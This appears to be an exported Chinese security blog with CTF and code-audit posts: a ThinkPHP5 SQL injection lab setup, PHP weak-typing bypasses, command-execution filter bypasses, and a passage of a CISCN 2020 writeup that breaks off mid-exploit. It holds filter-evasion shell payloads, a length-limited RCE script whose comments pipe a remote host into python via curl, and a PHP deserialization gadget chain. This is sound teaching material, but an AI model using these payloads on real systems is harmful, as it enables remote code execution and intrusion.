    <url>/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>环境搭建卡了挺久的，这里记录一下。</p><ul>
<li><p>多版本的php</p>
<p>如果是Ubuntu，参考以下代码</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update						  //更新源</span><br><span class="line">sudo apt-get install php5.6				  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>

<p>如果是kali，参考一下代码</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure>
</li>
<li><p>composer</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">mv composer.phar <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>composer</span><br><span class="line"><span class="regexp">//</span>记得加环境变量</span><br><span class="line"><span class="regexp">//</span>换源</span><br><span class="line">composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>安装tp5源码</p>
<p>这里以thinkphp v5.0.15为例</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">cd </span>/<span class="string">var/</span><span class="string">www/</span></span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">topthink/</span><span class="string">think=</span>5.0.<span class="string">15 </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">cd </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">vim </span><span class="string">composer.</span><span class="string">json </span>//将<span class="string">"topthink/framework"</span>:<span class="string">"5.0.*"</span> &gt;&gt;<span class="string">"topthink/framework"</span>:<span class="string">"5.0.15"</span></span><br><span class="line"><span class="string">composer </span><span class="string">update </span>  //可能会报<span class="string">php插</span>件缺失，缺啥装啥。</span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="string">topthink/</span><span class="string">framework=</span>5.0.<span class="string">15 </span><span class="string">thinkphp </span>//这个<span class="string">"thinkphp"</span>名字不能改,可能会报依赖错误，按照提示修改<span class="string">thinkphp/</span><span class="string">composer.</span><span class="string">json</span></span><br><span class="line"><span class="string">cd </span><span class="string">thinkphp</span></span><br><span class="line"><span class="string">composer </span><span class="string">update</span></span><br></pre></td></tr></table></figure>

<p>至此源码全部下载下来了。</p>
</li>
<li><p>Apache</p>
<p>首先选择合适的php版本(&gt;5.4),我这里因为依赖问题所以选择7.0</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a2dismod php5<span class="number">.6</span>  <span class="comment">//关闭php5.6</span></span><br><span class="line">a2enmod php7<span class="number">.0</span>   <span class="comment">//开启php7.0</span></span><br><span class="line">systemctl restart apache2  <span class="comment">//重启生效</span></span><br></pre></td></tr></table></figure>

<p>创建虚拟目录  <code>/etc/apache2/sites-available/000-default.conf</code></p>
<p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163405433.png" alt="image-20210320163405433"></p>
<p>增加监听端口 <code>/etc/apache2/ports.conf</code>  </p>
<p><img src="/2021/03/Thinkphp5-SQL注入漏洞分析/image-20210320163814936.png" alt="image-20210320163814936"></p>
<p>创建日志目录(没有会导致apache服务重启失败)</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /<span class="built_in">var</span>/<span class="built_in">log</span>/apache2/tp5015</span><br><span class="line">systemctl <span class="built_in">restart</span> apache2</span><br></pre></td></tr></table></figure>

<p>大致的环境就是这样搭建的。遇到特殊情况就举一反三吧 - -!</p>
<p>在进行漏洞分析前我们先来了解下tp的路由有两种模式</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br></pre></td></tr></table></figure>

</li>
</ul><a id="more"></a>

<h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><ul>
<li><p>漏洞分析</p>
<p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p>
<p>将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span></span><br><span class="line"><span class="php">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在 <strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>application/config.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> tp5015demo;</span><br><span class="line"><span class="keyword">use</span> tp5015demo;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">true<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">trueusername <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>漏洞利用</li>
</ul>
<h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><h3 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h3><h3 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h3><h3 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h3><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>thinkphp</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>php弱类型</title>
    <url>/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h2><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。而弱类型语言，不会检查变量类型，可以随时的转换变量类型。</p><a id="more"></a>
<p>在php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//随意转换变量类型</span></span><br></pre></td></tr></table></figure>

<p>但在C语言中任何变量都要先定义变量类型，再进行赋值。</p>
<h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>在编程中类型转换是不可避免的一个事情，比如说网络编程中get方法或者post方法传入一个需要转换成int的值，再比如说变量间进行比较的时候，需要将变量进行转换，鉴于php是自动进行类型转换，所以会引发很多意想不到的问题。</p>
<p>php有两种比较方式,一种是“= =” 一种是“= = =”这两种都可以比较两个数字的大小，但是有很明显的区别。</p>
<p>“= =”：会把两端变量类型转换成相同的，在进行比较。</p>
<p>“= = =”：会先判断两端变量类型是否相同，在进行比较。</p>
<h2 id="类型转换问题"><a href="#类型转换问题" class="headerlink" title="类型转换问题"></a>类型转换问题</h2><p>php中最常见的就是string 转int，或者int转string。</p>
<p>一般有两种方法，一是强制类型转换<code>(string)$x</code>或<code>strval($x)</code>,<code>(int)$x</code>或<code>intval($X)</code>,二是根据运算符自动转换。</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="number">123</span>;var_dump($a); <span class="comment">//int(123)</span></span><br><span class="line">var_dump($a + <span class="string">"123"</span>); <span class="comment">//int(246)</span></span><br><span class="line">var_dump($a . <span class="string">"123"</span>); <span class="comment">//string(6) "123123"</span></span><br><span class="line">var_dump($a ==<span class="string">"123a1"</span>); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a == <span class="string">"123e1"</span>); <span class="comment">//bool(false)</span></span><br><span class="line">var_dump($a == <span class="string">"12.3e1"</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>如果是运算符则会自动转换成数值再进行计算，如果是字符串运算符则转换成字符串再计算</p>
<p>如果是“==”，则会把字符串转换成数值，根据官方文档如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
<h2 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h2><p>hash1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//假设flag的值不可见</span></span><br><span class="line">$int =<span class="number">0</span>;  <span class="comment">//为$int赋值 使其满足if的条件</span></span><br><span class="line"><span class="keyword">if</span>($flag !== $int &amp;&amp; md5($flag) == $int) <span class="comment">//注意"！==" 先判断类型</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"correct\n"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"incorrect\n"</span>;</span><br></pre></td></tr></table></figure>

<p>为$int赋何值，才能满足条件？</p>
<p>先看下面几个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag1 = <span class="string">"&#123;You_can't_see_me&#125;"</span>;</span><br><span class="line">$flag2 = <span class="string">"&#123;You_can't_see&#125;"</span>;</span><br><span class="line">$flag3 = <span class="string">"&#123;You_can't_se&#125;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(md5($flag1));  <span class="comment">//string(32) "dc39eb7c561e8753d2ce41cb2e1f798b"</span></span><br><span class="line">var_dump(intval(md5($flag1)));  <span class="comment">//int(0)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag2));  <span class="comment">//string(32) "2e2e029620ec42eb68bc24e88d35b027"</span></span><br><span class="line">var_dump(intval(md5($flag2)));  <span class="comment">//int(200)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag3));  <span class="comment">//string(32) "58a39a758897868896d56904481fb4a0"</span></span><br><span class="line">var_dump(intval(md5($flag3)));  <span class="comment">//int(58)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">"1e1q"</span> == <span class="number">10</span>);  <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">"1eq"</span> == <span class="number">1</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>不难看出，不论$flag的值是什么，md5函数都会返回32位的16进制数，利用转换漏洞，可以轻松爆破，从而绕过。但如果e后面有比较长的纯数字字符那么就别想着爆破了(概率较小)。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//假设flag的值不可见</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$j=intval(md5($flag));</span><br><span class="line"><span class="keyword">while</span>($i!=$j)</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $i; <span class="comment">//721</span></span><br></pre></td></tr></table></figure>

<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><p> JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> 输入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什么，但是我们知道一件事就是它肯定是字符串，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个数值就可以相等了。最终payload message={“key”:0}。 如果$key中的字符串开头并不是字母，则需要我们去爆破。</p>
<p><a href="https://www.cnblogs.com/anbus/p/10000571.html" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行与绕过</title>
    <url>/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line">cat<span class="variable">$IFS</span><span class="variable">$9flag</span>.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  //(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><a id="more"></a>

<p>$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。</p>
<h2 id="2-命令分割符"><a href="#2-命令分割符" class="headerlink" title="2.命令分割符"></a>2.命令分割符</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>a 换行符</span><br><span class="line">%<span class="number">0</span>d 回车符</span><br><span class="line">; 表示连续指令</span><br><span class="line"><span class="meta">&amp; 表示将前一个命令设置进入后台</span></span><br><span class="line"><span class="string">| 管道符，将前一个命令的输出作为后一个命令的输入</span></span><br><span class="line"><span class="meta">&amp;&amp; 前一个命令执行成功才会执行下一条命令</span></span><br><span class="line"><span class="string">|| 前一个命令执行失败才会执行下一条命令</span></span><br></pre></td></tr></table></figure>

<h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span>  //变量绕过</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"bHMK"</span> |base64 -d` //base64编码</span><br></pre></td></tr></table></figure>

<h2 id="4-短命令执行"><a href="#4-短命令执行" class="headerlink" title="4.短命令执行"></a>4.短命令执行</h2><p>大体上的想法就是通过重命名文件绕过，然后通过<code>ls</code>来将文件名写入到文件中，<code>&gt;</code>这个重定向符号可以来创建文件，其中文件名是<code>&gt;</code>后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过<code>ls</code>打印出来再重定向<code>&gt;</code>到一个木马文件中，就可以执行了</p>
<ul>
<li><h3 id="拼接方法"><a href="#拼接方法" class="headerlink" title="拼接方法"></a>拼接方法</h3></li>
</ul>
<ol>
<li>两个反斜杠<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来反义后一个<code>\</code>的。这种方法的话需要精心构造输入，利用倒叙来输入，然后<code>ls</code>的时候需要加<code>-t</code>参数来排列一下，虽然报错了但是也执行成功了</li>
</ol>
<p><img src="/2020/06/命令执行与绕过/image-20200610155026769.png" alt="image-20200610155026769"></p>
<ul>
<li><h4 id="七字绕过"><a href="#七字绕过" class="headerlink" title="七字绕过"></a>七字绕过</h4></li>
</ul>
<p>题目源码如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">&gt;php<span class="string">\\</span></span><br><span class="line">&gt;ell.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> sh<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> -O<span class="string">\\</span></span><br><span class="line">&gt;com<span class="string">\\</span></span><br><span class="line">&gt;idu.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> ba<span class="string">\\</span></span><br><span class="line">&gt;wget<span class="string">\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/命令执行与绕过/image-20200610172713846.png" alt="image-20200610172713846"></p>
<ul>
<li><h4 id="五字绕过"><a href="#五字绕过" class="headerlink" title="五字绕过"></a>五字绕过</h4></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>因为长度要小于5，所以我们无法执行<code>ls -t&gt;a</code></p>
<p>所以思路是先构造 <code>ls -t&gt;a</code></p>
<p>exp</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">from</span> <span class="built_in">time</span> import sleep</span><br><span class="line"><span class="built_in">from</span> urllib import <span class="literal">quote</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">    <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">    <span class="string">'&gt;on'</span>, </span><br><span class="line">    <span class="string">'&gt;th\\'</span>, </span><br><span class="line">    <span class="string">'&gt;py\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>, </span><br><span class="line">    <span class="string">'&gt;pw\\'</span>, </span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>, </span><br><span class="line">    <span class="string">'&gt;l.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;el\\'</span>, </span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    assert <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?cmd='</span> + <span class="literal">quote</span>(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="四字绕过"><a href="#四字绕过" class="headerlink" title="四字绕过"></a>四字绕过</h4></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>最大的问题还是<code>ls -t&gt;g</code>这个问题</p>
<p><img src="/2020/06/命令执行与绕过/image-20200610180226760.png" alt="image-20200610180226760"></p>
<p>这个exp的构造非常的细致</p>
<p>首先是 <code>ht-</code>加了个 <code>h</code>参数但效果和 <code>-t</code>一样 但可以让 <code>ht-</code>排在<code>sl</code>前面</p>
<p>选择<code>dir</code>列目录，<code>dir</code>排在第一位，<code>*</code>直接会执行<code>dir</code>命令</p>
<p>之后 <code>rev</code>逆序文件。</p>
<p>后面都是一样的就不讲了</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>绕过</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>第十三届全国大学生信息安全竞赛初赛Writeup</title>
    <url>/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>扫目录拿源码</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824112713676.png" alt="image-20200824112713676"></p><p>wmctf2020 <a href="http://blog.ccreater.top/2020/08/04/wmctf2020/#webweb" target="_blank" rel="noopener">webweb的原题</a>，直接用exp打</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">  <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span> <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">    <span class="title">protected</span></span><br><span class="line">      $<span class="title">props</span>=["<span class="title">quotekey</span>"=&gt;"<span class="title">call_user_func</span>"],</span><br><span class="line">      $<span class="title">adhoc</span>=["<span class="title">phpinfo</span>"=&gt;["<span class="title">expr</span>"=&gt;""]],</span><br><span class="line">      $<span class="title">db</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span><span class="params">($offset, $value)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">server</span>="";</span><br><span class="line">    <span class="keyword">public</span> $events;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;events=[<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">""</span>)),<span class="string">"find"</span>)];</span><br><span class="line">      <span 